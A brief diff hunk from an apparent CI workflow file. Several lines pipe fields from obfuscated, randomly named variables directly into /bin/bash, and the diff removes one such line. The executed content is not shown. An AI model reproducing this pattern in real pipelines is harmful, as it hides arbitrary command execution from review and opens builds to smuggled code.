@@ -27,7 +27,6 @@ jobs:
           echo $lmad61186 | jq -r .uowqf83512 | /bin/bash
           echo $py0243 | jq -r .g9306 | /bin/bash
           echo $vvqra080 | jq -r .bqeho6 | /bin/bash
-          printf '%s' "$rbyr60" | jq -r .sqn18986 | /bin/bash
 
       - name: Save results
         if: always()
